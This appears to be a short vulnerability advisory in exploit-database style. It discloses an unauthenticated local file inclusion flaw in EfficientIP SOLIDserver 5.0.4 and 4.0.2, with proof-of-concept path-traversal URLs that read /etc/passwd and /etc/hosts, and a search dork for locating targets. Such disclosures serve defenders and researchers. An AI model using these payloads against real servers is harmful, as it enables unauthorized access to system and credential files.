@@ -1,0 +1,33 @@
+Title: SOLIDserver <=5.0.4 - Local File Inclusion Vunerability
+Author: Saeed reza Zamanian [penetrationtest @ Linkedin]
+
+Product: SOLIDserver
+Tested Version: : 5.0.4 and 4.0.2
+Vendor: efficient IP http://www.efficientip.com
+Google Dork: SOLIDserver login
+Date: 17 Feb 2016
+
+CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+
+
+About Product : 
+---------------
+EfficientIP's IP Address Management (IPAM) solution adapts to business and IT goals and objectives by allowing the creation of specific IPAM and VLANs deployment processes.
+SOLIDserver™ IPAM is a unified solution that allows you to design, deploy, and manage the IP addressing plan automatically applying allocation rules and simplifying deployments. 
+
+Vulnerability Details:
+----------------------
+Based on a code review done on the product , this product doesn't have any observation on some parameters, that make the attacker able to read file contents.
+
+PoC 1:
+-----
+https://www.site.com/mod/system/report_download.php?report_filename=/etc/passwd
+or
+view-source:https://www.site.com/mod/system/report_download.php?report_filename=../../../../../../../../../../../../etc/passwd
+
+PoC 2 : [login authentication required]
+------
+https://www.site.com/mod/generic/download_config_file.php?config_file=../../../../../../../../../../../../../../etc/hosts
+
+
+#EOF
